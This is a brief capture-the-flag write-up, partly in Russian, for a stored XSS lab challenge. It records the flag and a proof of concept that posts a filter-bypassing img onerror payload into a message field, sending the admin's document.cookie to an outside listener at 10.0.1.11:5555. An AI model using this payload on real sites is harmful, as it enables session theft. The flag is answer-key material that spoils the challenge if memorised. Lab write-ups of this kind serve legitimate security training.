#Флаг
Dont_regex_XSS


# POC

- in browser open `http://10.0.2.10`
- show params in burp `name&message`
- to steal admin cookie can post script to write cookie in db

- В поле message нужно внести <<<iimgimg src=x onerror=this.src='http://10.0.1.11:5555/?c='+document.cookie>
